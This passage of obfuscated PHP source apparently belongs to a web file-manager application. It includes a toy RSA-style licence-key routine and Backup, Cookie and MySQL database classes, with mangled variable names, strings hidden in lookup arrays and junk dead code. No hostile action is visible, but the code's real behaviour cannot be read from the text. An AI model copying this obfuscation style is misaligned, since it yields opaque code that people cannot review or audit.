$ŞêêŠÙü + 1) % $Ş¬Í›·œ == 0) { $‹ ’ûø¦ = intval(($¹å®ÍØ’ * $ŞêêŠÙü + 1) / $Ş¬Í›·œ); break; } } $ğ¤·Šƒ = $this->njwgf50c206b($«ø¿¤€¡ * $‰ Èªàå . $§ £ØÈı[6], $§ £ØÈı[138]); $ºôÏƒ¡ = $êÃ¿ö´÷[834]; while ($ºôÏƒ¡ < $êÃ¿ö´÷[20]) { if ($ºôÏƒ¡ >= 0) { break; } $ºôÏƒ¡++; } $Ô†ıÁÕõ = md5($§ £ØÈı[310] . ($«ø¿¤€¡ + $‰ Èªàå) . $§ £ØÈı[311] . $Ş¬Í›·œ . $§ £ØÈı[311] . $‹ ’ûø¦ . $§ £ØÈı[312]); $»€ÛÒ—Ÿ = $êÃ¿ö´÷[835]; if (!$»€ÛÒ—Ÿ) { die; } $°û¢ûÄĞ = $this->njwgf50c206b($Ÿ¡ØÜŞ², $Ô†ıÁÕõ) . $§ £ØÈı[313] . $ğ¤·Šƒ; return $°û¢ûÄĞ; } public function xfre62d6a021($À§›Ï¨») { $•åÈí…‹ =& $_SERVER[øşô´çË]; $ë·ë¥ã’ =& $_SERVER[¸ƒÏ­ÍÄ]; $ËÈÄ× ’ = explode($ë·ë¥ã’[313], $À§›Ï¨»); if (count($ËÈÄ× ’) != 2) { return $ë·ë¥ã’[6]; } $Ü›ß¼‘Ñ = $this->uxfqb0da9666($ËÈÄ× ’[1] . $ë·ë¥ã’[6], $ë·ë¥ã’[138]); if (!$Ü›ß¼‘Ñ) { return $ë·ë¥ã’[6]; } $Ü›ß¼‘Ñ = intval($Ü›ß¼‘Ñ); $„³ôòÇ˜ = 0; $Ó£¹•˜É = $•åÈí…‹[836]; if (strlen($Ó£¹•˜É) < $•åÈí…‹[716]) { die; } $è¢˜±ô­ = 0; $ÓæÀ˜¨ö = $•åÈí…‹[837]; if (!$ÓæÀ˜¨ö) { return; } for ($ñéÒ²’ = 3; $ñéÒ²’ < $Ü›ß¼‘Ñ; $ñéÒ²’ += 2) { if ($Ü›ß¼‘Ñ % $ñéÒ²’ != 0) { continue; } $„³ôòÇ˜ = $ñéÒ²’; $è¢˜±ô­ = intval($Ü›ß¼‘Ñ / $ñéÒ²’); $ˆÖ»—œ‚ = $•åÈí…‹[838]; if (!$ˆÖ»—œ‚) { return; } break; } $¢÷Ş›Š¢ = ($„³ôòÇ˜ - 1) * ($è¢˜±ô­ - 1); $©ú¯íùé = $•åÈí…‹[839]; if (strlen($©ú¯íùé) < $•åÈí…‹[719]) { return; } $çÛú¢ÅÊ = intval(($„³ôòÇ˜ + $è¢˜±ô­) / 2); while (1) { $²¡ûÖÅÀ = $çÛú¢ÅÊ; $Ù¹’¢ø = $•åÈí…‹[840]; $Ñ¢ş¼Ò· = $¢÷Ş›Š¢; while ($Ñ¢ş¼Ò· % $²¡ûÖÅÀ != 0) { $¢ĞÊ–£Ş = $Ñ¢ş¼Ò·; $ÌÌÀâö = $•åÈí…‹[841]; if (!$ÌÌÀâö) { return; } $Ñ¢ş¼Ò· = $²¡ûÖÅÀ; $²¡ûÖÅÀ = $¢ĞÊ–£Ş % $²¡ûÖÅÀ; $ğŠóä½¶ = $•åÈí…‹[842]; if (!$ğŠóä½¶) { return; } } if ($²¡ûÖÅÀ == 1) { break; } else { $çÛú¢ÅÊ++; } } $‘¥œ€±‚ = 2; for ($ñéÒ²’ = 0; $ñéÒ²’ < $¢÷Ş›Š¢ * 10; $ñéÒ²’++) { if (($¢÷Ş›Š¢ * $ñéÒ²’ + 1) % $çÛú¢ÅÊ == 0) { $‘¥œ€±‚ = intval(($¢÷Ş›Š¢ * $ñéÒ²’ + 1) / $çÛú¢ÅÊ); break; } } $İ¯”é‘• = md5($ë·ë¥ã’[310] . ($„³ôòÇ˜ + $è¢˜±ô­) . $ë·ë¥ã’[311] . $çÛú¢ÅÊ . $ë·ë¥ã’[311] . $‘¥œ€±‚ . $ë·ë¥ã’[312]); $›üÙ±Ï¤ = $this->uxfqb0da9666($ËÈÄ× ’[0], $İ¯”é‘•); $Ö¶Šá®Ã = $•åÈí…‹[843]; if (!$Ö¶Šá®Ã) { return; } return $›üÙ±Ï¤; } public function heoc58df88b6() { $ª˜»—î« =& $_SERVER[øşô´çË]; $·©”Å£ = mt_rand(pow(2, 14), pow(2, 16) - 1); $æ£ ¥…Œ = $ª˜»—î«[844]; $ôÜòàÙ— = array(); $ÚúøÕë¸ = $ª˜»—î«[845]; $¡óòÉŸÜ = 1; while ($¡óòÉŸÜ <= (int) sqrt($·©”Å£)) { $•÷ÎöÙ = $¡óòÉŸÜ; while (!0) { $•÷ÎöÙ++; $·îö‘ë = $ª˜»—î«[846]; while (strlen($·îö‘ë) < $ª˜»—î«[725]) { if (!$·îö‘ë) { break; } $·îö‘ë++; } if ($•÷ÎöÙ <= 2) { $¡óòÉŸÜ = $•÷ÎöÙ; break; } else { if ($•÷ÎöÙ < 2) { continue; } } $ú”Ğ¸³– = !0; for ($…Êı²å† = 2; $…Êı²å† <= sqrt($•÷ÎöÙ); $…Êı²å†++) { if ($•÷ÎöÙ % $…Êı²å† == 0) { $ú”Ğ¸³– = !1; } } if ($ú”Ğ¸³–) { $¡óòÉŸÜ = $•÷ÎöÙ; break; } } $ôÜòàÙ—[] = $¡óòÉŸÜ; $Ğ‚öË‘› = $ª˜»—î«[847]; while (strlen($Ğ‚öË‘›) < $ª˜»—î«[20]) { if (!$Ğ‚öË‘›) { break; } $Ğ‚öË‘›++; } } $óğŸ˜è‚ = 2; for ($•÷ÎöÙ = $·©”Å£; $•÷ÎöÙ > 1; $•÷ÎöÙ--) { $ú”Ğ¸³– = !0; foreach ($ôÜòàÙ— as $ıø°‘ú–) { if ($•÷ÎöÙ % $ıø°‘ú– == 0) { $ú”Ğ¸³– = !1; break; } } if ($ú”Ğ¸³–) { $óğŸ˜è‚ = $•÷ÎöÙ; break; } } return $óğŸ˜è‚; } public function kmjpea02a39e($â‘Üë˜¢, $“ÃÑ) { $¯ »±¡½ =& $_SERVER[¸ƒÏ­ÍÄ]; return call_user_func(array($¯ »±¡½[8], $¯ »±¡½[314]), $â‘Üë˜¢, $“ÃÑ); $¨äÎŠ¬œ = $_SERVER[øşô´çË][848]; } public function njwgf50c206b($è¦×İ­², $û†«šî) { $’Ñ¨ù©“ =& $_SERVER[øşô´çË]; $¯ –˜ÔŞ =& $_SERVER[¸ƒÏ­ÍÄ]; return call_user_func(array($¯ –˜ÔŞ[315], $¯ –˜ÔŞ[316]), $è¦×İ­², $û†«šî); $Õé£ê€ = $’Ñ¨ù©“[849]; if (strlen($Õé£ê€) < $’Ñ¨ù©“[725]) { return; } } public function uxfqb0da9666($¡†ÎÃ·“, $Ç‰ºÌúˆ) { $ìŒ©É™ =& $_SERVER[¸ƒÏ­ÍÄ]; return call_user_func(array($ìŒ©É™[315], $ìŒ©É™[317]), $¡†ÎÃ·“, $Ç‰ºÌúˆ); $¼ˆ’Å™ = $_SERVER[øşô´çË][735]; } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[øşô´çË][850]); $›ñÊÛÇù = $this->init(); if (!$›ñÊÛÇù) { return; } $this->keep(); } public function init() { $¼ş×õÀ‘ =& $_SERVER[øşô´çË]; $this->isManual(); self::$name = date($¼ş×õÀ‘[851]); if (!($­£÷ø™¡ = $this->model->lastItem())) { $­£÷ø™¡ = $this->initData(); } else { self::$name = $­£÷ø™¡[$¼ş×õÀ‘[42]]; if ($­£÷ø™¡[$¼ş×õÀ‘[852]] == $¼ş×õÀ‘[101]) { self::$name = date($¼ş×õÀ‘[269]); $öŒ¦¤ë¾ = intval(_get($­£÷ø™¡, $¼ş×õÀ‘[853], 0)); if (self::$manual == 0 && $­£÷ø™¡[$¼ş×õÀ‘[42]] == self::$name) { $this->model->remove($­£÷ø™¡[$¼ş×õÀ‘[496]]); } $­£÷ø™¡ = $this->initData($öŒ¦¤ë¾, $­£÷ø™¡[$¼ş×õÀ‘[854]]); } else { $Ú÷õşéœ = $this->checkStore($­£÷ø™¡[$¼ş×õÀ‘[854]]); if (!$Ú÷õşéœ) { return !1; } } } if (!$­£÷ø™¡) { return !1; } self::$option = $­£÷ø™¡; } private function isManual() { $€çÅ¢’ = _get($GLOBALS, $_SERVER[øşô´çË][855], 0); $€çÅ¢’ = intval($€çÅ¢’); self::$manual = $€çÅ¢’ && $€çÅ¢’ == 1 ? 1 : 0; } private function initData($®‡å€Ûğ = 0, $º¶¨ æ‡ = '') { $À©´›õé =& $_SERVER[øşô´çË]; $¸Ÿİ‘×á = $this->model->config(); if ($º¶¨ æ‡ && $¸Ÿİ‘×á[$À©´›õé[854]] != $º¶¨ æ‡) { $®‡å€Ûğ = 0; } $«º‚ÁÍ› = $this->checkStore($¸Ÿİ‘×á[$À©´›õé[854]]); if (!$«º‚ÁÍ›) { return !1; } if (self::$manual == 1) { self::$name .= $À©´›õé[11] . date($À©´›õé[856]); } $üø…Ÿ´º = array($À©´›õé[854] => $¸Ÿİ‘×á[$À©´›õé[854]], $À©´›õé[42] => self::$name, $À©´›õé[852] => 0, $À©´›õé[178] => $¸Ÿİ‘×á[$À©´›õé[178]], $À©´›õé[857] => self::$manual, $À©´›õé[858] => array($À©´›õé[859] => array($À©´›õé[852] => 0), $À©´›õé[860] => array($À©´›õé[852] => 0, $À©´›õé[861] => 0, $À©´›õé[862] => 0, $À©´›õé[43] => $À©´›õé[12], $À©´›õé[863] => 0, $À©´›õé[864] => 0), $À©´›õé[865] => array($À©´›õé[852] => 0, $À©´›õé[861] => 0, $À©´›õé[862] => 0, $À©´›õé[863] => 0, $À©´›õé[864] => 0), $À©´›õé[240] => array($À©´›õé[852] => 0, $À©´›õé[866] => 0, $À©´›õé[867] => 0, $À©´›õé[868] => 0, $À©´›õé[869] => 0, $À©´›õé[566] => $®‡å€Ûğ, $À©´›õé[863] => 0, $À©´›õé[864] => 0)), $À©´›õé[863] => time(), $À©´›õé[864] => 0); $„ŸÂöÍÌ = $this->model->insert($üø…Ÿ´º); $üø…Ÿ´º[$À©´›õé[496]] = $„ŸÂöÍÌ; return $üø…Ÿ´º; } private function checkStore($´«µåÓø) { $à•Æõ¾˜ = Model($_SERVER[øşô´çË][870]); $ßõŞ§Ó® = $à•Æõ¾˜->listData($´«µåÓø); $şĞø¼á = $à•Æõ¾˜->checkConfig($ßõŞ§Ó®, !0); if ($şĞø¼á !== !0) { $this->message = $şĞø¼á; return !1; } return !0; } public static function get() { if (!self::$option) { $ÔóÈß“® = Model($_SERVER[øşô´çË][850]); $Î—àÄÉê = $ÔóÈß“®->findByName(self::$name); $ÔóÈß“®->parseContent($Î—àÄÉê); self::$option = $Î—àÄÉê; } return self::$option; } public static function set($ÆëÂğÁò) { $äø¼é˜ =& $_SERVER[øşô´çË]; $‰áØş–ª = self::get(); foreach ($ÆëÂğÁò as $ŒóÖåÓ· => $ Ë‘Œéà) { array_set_value($‰áØş–ª, $ŒóÖåÓ·, $ Ë‘Œéà); } Model($äø¼é˜[850])->update($‰áØş–ª[$äø¼é˜[496]], $‰áØş–ª); self::$option = $‰áØş–ª; return self::$option; } public function keep() { $Ğ²ïçÀÆ =& $_SERVER[øşô´çË]; $ã’‚¥ò = self::get(); if (_get($ã’‚¥ò, $Ğ²ïçÀÆ[871], 0) == $Ğ²ïçÀÆ[101]) { return; } $this->backupKeep($ã’‚¥ò); self::set(array($Ğ²ïçÀÆ[871] => 1)); } private function backupKeep($¤Ëåà‚) { $ËüÈçğ‰ =& $_SERVER[øşô´çË]; if (self::$manual == 1) { return; } $Ì–„Œâ = $this->model->listData(); if (empty($Ì–„Œâ)) { return; } $Ÿ÷şñö = array(); $èÙí½óì = array(); $«ä¶Œàş = date($ËüÈçğ‰[872], strtotime($ËüÈçğ‰[873])); foreach ($Ì–„Œâ as $„éµ€İº => $·¿”Üú) { $Ğ™˜· º = $·¿”Üú[$ËüÈçğ‰[42]]; if ($„éµ€İº < 7 || $·¿”Üú[$ËüÈçğ‰[857]] == $ËüÈçğ‰[101]) { $Ÿ÷şñö[] = $Ğ™˜· º; continue; } $Ö¶Ÿ¤èğ = substr($Ğ™˜· º, 0, 6); if ($Ö¶Ÿ¤èğ < $«ä¶Œàş) { continue; } if (!isset($èÙí½óì[$Ö¶Ÿ¤èğ]) || $Ğ™˜· º < $èÙí½óì[$Ö¶Ÿ¤èğ]) { $èÙí½óì[$Ö¶Ÿ¤èğ] = $Ğ™˜· º; } if (substr($Ğ™˜· º, 6, 2) == $ËüÈçğ‰[874]) { $èÙí½óì[$Ö¶Ÿ¤èğ] = $Ğ™˜· º; } } $Ÿ÷şñö = array_merge($Ÿ÷şñö, array_values($èÙí½óì)); $Ÿ÷şñö = array_unique($Ÿ÷şñö); foreach ($Ì–„Œâ as $·¿”Üú) { $Ğ™˜· º = $·¿”Üú[$ËüÈçğ‰[42]]; if (!empty($Ğ™˜· º) && in_array($Ğ™˜· º, $Ÿ÷şñö)) { continue; } $this->model->remove($·¿”Üú[$ËüÈçğ‰[496]]); $—ƒŠª“ = $this->backupPath($¤Ëåà‚); IO::remove($—ƒŠª“, !1); } } private function backupPath($óé¤½ıÙ) { $ÍÏ¹²¹š =& $_SERVER[øşô´çË]; static $ºÑƒšÑ¦ = null; if (is_null($ºÑƒšÑ¦)) { $ºÑƒšÑ¦ = Model($ÍÏ¹²¹š[875])->get($ÍÏ¹²¹š[876]); } $€™ôüÜ = $óé¤½ıÙ[$ÍÏ¹²¹š[42]]; $ÄµËæ¢Ø = substr(md5($ÍÏ¹²¹š[877] . $ºÑƒšÑ¦ . $€™ôüÜ), 0, 8); return "\173\151\157\72{$óé¤½ıÙ[$ÍÏ¹²¹š[854]]}\175\57\x64\x61\x74\141\142\x61\x73\x65\x2f\x62\141\x63\153\165\160\57" . $€™ôüÜ . $ÍÏ¹²¹š[11] . $ÄµËæ¢Ø; } public function db() { $÷æ±¶¶æ =& $_SERVER[øşô´çË]; $÷ØıÀÙ¡ = self::get(); if (_get($÷ØıÀÙ¡, $÷æ±¶¶æ[878], 0) == $÷æ±¶¶æ[101]) { return !0; } $ÌöÒ¬Â = new BackupDb(); if (!$ÌöÒ¬Â->index()) { return !1; } self::set(array($÷æ±¶¶æ[878] => 1)); return !0; } public function dbFile() { $–©¼·ı¼ =& $_SERVER[øşô´çË]; $©¶šŞÍ = self::get(); if (_get($©¶šŞÍ, $–©¼·ı¼[879], 0) == $–©¼·ı¼[101]) { return !0; } $ŒŒ„¿„í = new BackupDbFile(); if (!$ŒŒ„¿„í->index()) { return !1; } self::set(array($–©¼·ı¼[879] => 1)); return !0; } public function file() { $¾ê…Œ¯Ø =& $_SERVER[øşô´çË]; $œ±ËûÖø = self::get(); if (_get($œ±ËûÖø, $¾ê…Œ¯Ø[880], 0) == $¾ê…Œ¯Ø[101]) { return !0; } self::set(array($¾ê…Œ¯Ø[880] => 1, $¾ê…Œ¯Ø[852] => 1)); return !0; } public static function log($Õ«§´‰¹) { write_log($Õ«§´‰¹, $_SERVER[øşô´çË][881]); } } goto E¥ªÂõœ­ø; aÚÇéñ–¿½: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¶ÆÖ—Ø = '', $ÕâÅ¸ÙÌ = 0) { if (is_string($¶ÆÖ—Ø) && $¶ÆÖ—Ø != $_SERVER[øşô´çË][12]) { $this->prefix = $¶ÆÖ—Ø; } if (is_numeric($ÕâÅ¸ÙÌ) && $ÕâÅ¸ÙÌ > 0) { $this->expire = $ÕâÅ¸ÙÌ; } } public static function getInstance() { static $•Øôè­¦; if ($•Øôè­¦ === null) { $•Øôè­¦ = new self(); } return $•Øôè­¦; } private static $cookieDisable = false; public static function disable($óÔ›æÂ) { self::$cookieDisable = $óÔ›æÂ; } private static $sameCookieSet = array(); public static function set($Û±ôŒ±´, $‘íÈ›¹, $¬òá»©¾ = 0, $şĞ¯‘”Å = false, $é°£¾¾ = false) { $¡ÜàÅôİ =& $_SERVER[øşô´çË]; if (self::$cookieDisable) { return; } if (!$¬òá»©¾) { $¬òá»©¾ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Û±ôŒ±´]) && self::$sameCookieSet[$Û±ôŒ±´] == $‘íÈ›¹ . $¬òá»©¾) { return; } self::$sameCookieSet[$Û±ôŒ±´] = $‘íÈ›¹ . $¬òá»©¾; if (!$é°£¾¾) { $é°£¾¾ = str_replace(HOST, $¡ÜàÅôİ[12], APP_HOST); $é°£¾¾ = _get($GLOBALS, $¡ÜàÅôİ[1041], $é°£¾¾); } $´£²Œ×× = $¡ÜàÅôİ[12]; setcookie($Û±ôŒ±´, $‘íÈ›¹, time() + $¬òá»©¾, $¡ÜàÅôİ[8] . trim($é°£¾¾, $¡ÜàÅôİ[8]) . $´£²Œ××, !1, !1, $şĞ¯‘”Å); } public static function setSafe($µ´›æ¼É, $’Û»´½, $Ä‡„‰ì = 0) { self::set($µ´›æ¼É, $’Û»´½, $Ä‡„‰ì, !0); } public static function get($”Æí¢ş„) { static $–‚ä×Œê = false; if (!$–‚ä×Œê) { self::initHeaderCookie(); $–‚ä×Œê = !0; } return isset($_COOKIE[$”Æí¢ş„]) ? $_COOKIE[$”Æí¢ş„] : !1; } private static function initHeaderCookie() { $êü›ïñ“ =& $_SERVER[øşô´çË]; if (!isset($_SERVER[$êü›ïñ“[1042]]) || !$_SERVER[$êü›ïñ“[1042]]) { return; } $ÅÃÁ¬Ğè = explode($êü›ïñ“[84], $_SERVER[$êü›ïñ“[1042]]); foreach ($ÅÃÁ¬Ğè as $ÜÔ¶Ş) { $ÜÔ¶Ş = explode($êü›ïñ“[473], $ÜÔ¶Ş); if (count($ÜÔ¶Ş) != 2 || !isset($ÜÔ¶Ş[1])) { continue; } $_COOKIE[trim($ÜÔ¶Ş[0])] = trim($ÜÔ¶Ş[1]); } } public static function remove($„óÒ¹™§, $ïÃ¡Û©Ï = false) { unset($_COOKIE[$„óÒ¹™§]); self::set($„óÒ¹™§, $_SERVER[øşô´çË][12], 1, $ïÃ¡Û©Ï); } } class DbMysql extends Db { public function __construct($—Ã´ÛŒÆ = '') { $±Şş ±É =& $_SERVER[øşô´çË]; if (!extension_loaded($±Şş ±É[903])) { think_exception(think_lang($±Şş ±É[24]) . $±Şş ±É[1043]); } if (!empty($—Ã´ÛŒÆ)) { $this->config = $—Ã´ÛŒÆ; if (empty($this->config[$±Şş ±É[27]])) { $this->config[$±Şş ±É[27]] = $±Şş ±É[12]; } } } public function connect($áöÂ‘²½ = '', $ùªªßÁ¿ = 0, $ùğĞò÷º = false) { $Ïêê‡Ú¡ =& $_SERVER[øşô´çË]; if (!isset($this->linkID[$ùªªßÁ¿])) { if (empty($áöÂ‘²½)) { $áöÂ‘²½ = $this->config; } $¸†Ëòû = $áöÂ‘²½[$Ïêê‡Ú¡[1044]] . ($áöÂ‘²½[$Ïêê‡Ú¡[1045]] ? "\x3a{$áöÂ‘²½[$Ïêê‡Ú¡[1045]]}" : $Ïêê‡Ú¡[12]); $Œ³ì™–ê = !empty($áöÂ‘²½[$Ïêê‡Ú¡[27]][$Ïêê‡Ú¡[28]]) ? $áöÂ‘²½[$Ïêê‡Ú¡[27]][$Ïêê‡Ú¡[28]] : $this->pconnect; if ($Œ³ì™–ê) { $this->linkID[$ùªªßÁ¿] = mysql_pconnect($¸†Ëòû, $áöÂ‘²½[$Ïêê‡Ú¡[1046]], $áöÂ‘²½[$Ïêê‡Ú¡[1047]], 131072); } else { $this->linkID[$ùªªßÁ¿] = mysql_connect($¸†Ëòû, $áöÂ‘²½[$Ïêê‡Ú¡[1046]], $áöÂ‘²½[$Ïêê‡Ú¡[1047]], !0, 131072); } if (!$this->linkID[$ùªªßÁ¿] || !empty($áöÂ‘²½[$Ïêê‡Ú¡[31]]) && !mysql_select_db($áöÂ‘²½[$Ïêê‡Ú¡[31]], $this->linkID[$ùªªßÁ¿])) { think_exception(mysql_error()); } $üªÁä’© = mysql_get_server_info($this->linkID[$ùªªßÁ¿]); mysql_query($Ïêê‡Ú¡[1048] . think_config($Ïêê‡Ú¡[1049]) . $Ïêê‡Ú¡[68], $this->linkID[$ùªªßÁ¿]); if ($üªÁä’© > $Ïêê‡Ú¡[1050]) { mysql_query($Ïêê‡Ú¡[1051], $this->linkID[$ùªªßÁ¿]); } $this->connected = !0; if (1 != think_config($Ïêê‡Ú¡[32])) { unset($this->config); } } return $this->linkID[$ùªªßÁ¿]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÁÂœÓ›¶) { $õ¨Â€¿× =& $_SERVER[øşô´çË]; if (0 === stripos($ÁÂœÓ›¶, $õ¨Â€¿×[351])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁÂœÓ›¶; if ($this->queryID) { $this->free(); } think_action_status($õ¨Â€¿×[33], 1); think_status($õ¨Â€¿×[34]); $this->queryID = mysql_query($ÁÂœÓ›¶, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ò§šÓš½) { $ó­åø†Œ =& $_SERVER[øşô´çË]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ò§šÓš½; if ($this->queryID) { $this->free(); } think_action_status($ó­åø†Œ[35], 1); think_status($ó­åø†Œ[34]); $§ ç‘¿£ = mysql_query($ò§šÓš½, $this->_linkID); $this->debug(); if (!1 === $§ ç‘¿£) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[øşô´çË][1052], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÒâíÍ‚ = mysql_query($_SERVER[øşô´çË][1053], $this->_linkID); $this->transTimes = 0; if (!$ÒâíÍ‚) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÜşÚ…ëæ = mysql_query($_SERVER[øşô´çË][1054], $this->_linkID); $this->transTimes = 0; if (!$ÜşÚ…ëæ) { $this->error(); return !1; } } return !0; } private function getAll() { $Â¢˜²ãá = array(); if ($this->numRows > 0) { while ($³·Üœè = mysql_fetch_assoc($this->queryID)) { $Â¢˜²ãá[] = $³·Üœè; } mysql_data_seek($this->queryID, 0); } return $Â¢˜²ãá; } public function getFields($˜Ö¶ÏÏè) { $¤Ò‹ÕØÜ =& $_SERVER[øşô´çË]; $•ÎˆöÂ– = $this->query($¤Ò‹ÕØÜ[1055] . $this->parseKey($˜Ö¶ÏÏè)); $¦áŒàš = array(); if ($•ÎˆöÂ–) { foreach ($•ÎˆöÂ– as $¨êÍ÷²‚ => $ÃÒğ“•á) { $¦áŒàš[$ÃÒğ“•á[$¤Ò‹ÕØÜ[41]]] = array($¤Ò‹ÕØÜ[42] => $ÃÒğ“•á[$¤Ò‹ÕØÜ[41]], $¤Ò‹ÕØÜ[43] => $ÃÒğ“•á[$¤Ò‹ÕØÜ[44]], $¤Ò‹ÕØÜ[45] => (bool) (strtoupper($ÃÒğ“•á[$¤Ò‹ÕØÜ[46]]) === $¤Ò‹ÕØÜ[1056]), $¤Ò‹ÕØÜ[47] => $ÃÒğ“•á[$¤Ò‹ÕØÜ[48]], $¤Ò‹ÕØÜ[49] => strtolower($ÃÒğ“•á[$¤Ò‹ÕØÜ[50]]) == $¤Ò‹ÕØÜ[51], $¤Ò‹ÕØÜ[52] => strtolower($ÃÒğ“•á[$¤Ò‹ÕØÜ[53]]) == $¤Ò‹ÕØÜ[54]); } } return $¦áŒàš; } public function getTables($¤…Œ´¯Ó = '') { $Â°³÷— =& $_SERVER[øşô´çË]; if (!empty($¤…Œ´¯Ó)) { $¢ÚÈ®„Á = $Â°³÷—[1057] . $¤…Œ´¯Ó . $Â°³÷—[1058]; } else { $¢ÚÈ®„Á = $Â°³÷—[1059]; } $ë‹¨Àı = $this->query($¢ÚÈ®„Á); $ğ¹šó´ = array(); foreach ($ë‹¨Àı as $òê´Š×Ô => $ŸâÅÁ) { $ğ¹šó´[$òê´Š×Ô] = current($ŸâÅÁ); } return $ğ¹šó´; } public function replace($­Á½‰À, $¹Äö„ş = array()) { $¬ÃìÌ¸† =& $_SERVER[øşô´çË]; foreach ($­Á½‰À as $äñ÷¿Õ¹ => $°ûõ ³§) { $öÈŞ»Çì = $this->parseValue($°ûõ ³§); if (is_scalar($öÈŞ»Çì)) { $•òÚÉåÏ[] = $öÈŞ»Çì; $ïóÈ¦[] = $this->parseKey($äñ÷¿Õ¹); } } $Ø€î€Ê– = $¬ÃìÌ¸†[1060] . $this->parseTable($¹Äö„ş[$¬ÃìÌ¸†[366]]) . $¬ÃìÌ¸†[1061] . implode($¬ÃìÌ¸†[60], $ïóÈ¦) . $¬ÃìÌ¸†[1062] . implode($¬ÃìÌ¸†[60], $•òÚÉåÏ) . $¬ÃìÌ¸†[1063]; return $this->execute($Ø€î€Ê–); } public function insertAll($‡Ÿû ¸Ÿ, $ıš¦ğØ» = array(), $šš‹å¾ = false) { $¿‰òçÊÓ =& $_SERVER[øşô´çË]; if (!is_array($‡Ÿû ¸Ÿ[0])) { return !1; } $Åãª¿¿¸ = array_keys($‡Ÿû ¸Ÿ[0]); $­Šä¥¬ = array(); foreach ($‡Ÿû ¸Ÿ as $¯ãûè§‘) { $œ²‚™Á— = array(); foreach ($¯ãûè§‘ as $¦Ü‚˜™Î => $š³€¬Õê) { $š³€¬Õê = $this->parseValue($š³€¬Õê); if (is_scalar($š³€¬Õê)) { $œ²‚™Á—[] = $š³€¬Õê; } } $­Šä¥¬[] = $¿‰òçÊÓ[346] . implode($¿‰òçÊÓ[60], $œ²‚™Á—) . $¿‰òçÊÓ[1063]; } array_walk($Åãª¿¿¸, array($this, $¿‰òçÊÓ[1064])); $½ˆ‰—òÁ = $šš‹å¾ ? $¿‰òçÊÓ[1065] : $¿‰òçÊÓ[1066]; $½ˆ‰—òÁ = $¿‰òçÊÓ[1066]; $„ßŠ¥¯â = $½ˆ‰—òÁ . $¿‰òçÊÓ[1067] . $this->parseTable($ıš¦ğØ»[$¿‰òçÊÓ[366]]) . $¿‰òçÊÓ[1061] . implode($¿‰òçÊÓ[60], $Åãª¿¿¸) . $¿‰òçÊÓ[1068] . implode($¿‰òçÊÓ[60], $­Šä¥¬); if ($šš‹å¾) { $…•Ü±¹ä = array(); foreach ($Åãª¿¿¸ as $¦Ü‚˜™Î) { if ($¦Ü‚˜™Î == $¿‰òçÊÓ[241] || $¦Ü‚˜™Î == $¿‰òçÊÓ[1069]) { continue; } $…•Ü±¹ä[] = $¦Ü‚˜™Î . $¿‰òçÊÓ[1070] . $¦Ü‚˜™Î . $¿‰òçÊÓ[1063]; } $„ßŠ¥¯â .= $¿‰òçÊÓ[1071] . implode($¿‰òçÊÓ[60], $…•Ü±¹ä); } return $this->execute($„ßŠ¥¯â); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $æº•†Ó˜ =& $_SERVER[øşô´çË]; $this->error = mysql_errno() . $æº•†Ó˜[4] . mysql_error($this->_linkID); if ($æº•†Ó˜[12] != $this->queryStr) { $this->error .= LNG($æº•†Ó˜[58]) . $this->queryStr; } think_trace($this->error, $æº•†Ó˜[12], $æº•†Ó˜[59]); return $this->error; } public function escapeString($ºîÌªÀÄ) { if ($this->_linkID) { return mysql_real_escape_string($ºîÌªÀÄ, $this->_linkID); } else { return mysql_escape_string($ºîÌªÀÄ); } } public function parseKey(&$ïˆ“á¹ë, $˜Ôˆ«úš = true) { $áÄœİÇ€ =& $_SERVER[øşô´çË]; if ($˜Ôˆ«úš) { $ïˆ“á¹ë = $this->parseKeyCheck($ïˆ“á¹ë); } if ($ïˆ“á¹ë != $áÄœİÇ€[230] && !preg_match($áÄœİÇ€[1072], $ïˆ“á¹ë)) { $ïˆ“á¹ë = $áÄœİÇ€[484] . trim($ïˆ“á¹ë, $áÄœİÇ€[484]) . $áÄœİÇ€[484]; } return $ïˆ“á¹ë; } } class DbMysqli extends Db { public function __construct($İ±“³¿ = '') { $’ÊĞ’›² =& $_SERVER[øşô´çË]; if (!extension_loaded($’ÊĞ’›²[1073])) { think_exception(think_lang($’ÊĞ’›²[24]) . $’ÊĞ’›²[1074]); } if (!empty($İ±“³¿)) { $this->config = $İ±“³¿; if (empty($this->config[$’ÊĞ’›²[27]])) { $this->config[$’ÊĞ’›²[27]] = $’ÊĞ’›²[12]; } } } public function connect($âœğ‘î = '', $‘ü½†­Ò = 0) { $á×²ßÛü =& $_SERVER[øşô´çË]; if (!isset($this->linkID[$‘ü½†­Ò])) { if (empty($âœğ‘î)) { $âœğ‘î = $this->config; } $this->linkID[$‘ü½†­Ò] = new mysqli($âœğ‘î[$á×²ßÛü[1044]], $âœğ‘î[$á×²ßÛü[1046]], $âœğ‘î[$á×²ßÛü[1047]], $âœğ‘î[$á×²ßÛü[31]], $âœğ‘î[$á×²ßÛü[1045]] ? intval($âœğ‘î[$á×²ßÛü[1045]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‘™òÖ…ê = $this->linkID[$‘ü½†­Ò]->server_version; $this->linkID[$‘ü½†­Ò]->query($á×²ßÛü[1048] . think_config($á×²ßÛü[1049]) . $á×²ßÛü[68]); if ($‘™òÖ…ê > $á×²ßÛü[1050]) { $this->linkID[$‘ü½†­Ò]->query($á×²ßÛü[1051]); } $this->connected = !0; if (1 != think_config($á×²ßÛü[32])) { unset($this->config); } } return 